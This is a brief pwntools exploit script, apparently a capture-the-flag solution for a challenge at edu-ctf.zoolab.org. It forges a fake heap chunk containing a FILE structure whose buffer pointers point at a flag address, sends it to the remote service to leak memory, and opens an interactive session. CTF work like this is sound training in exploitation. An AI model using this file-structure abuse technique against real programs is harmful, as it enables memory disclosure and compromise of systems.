from pwn import *
context.arch = 'amd64'

flag_addr = 0x404050

fake_chunk = flat(
    b'AAAAAAAA', b'AAAAAAAA',
    0, 0x1e1,
    0xfbad0800, 0,
    flag_addr, 0,
    flag_addr, flag_addr + 0xd,
    0, 0,
    0, 0,
    0, 0,
    0, 0,
    1,
)

r = remote('edu-ctf.zoolab.org', 10010)
r.send(fake_chunk)
r.interactive()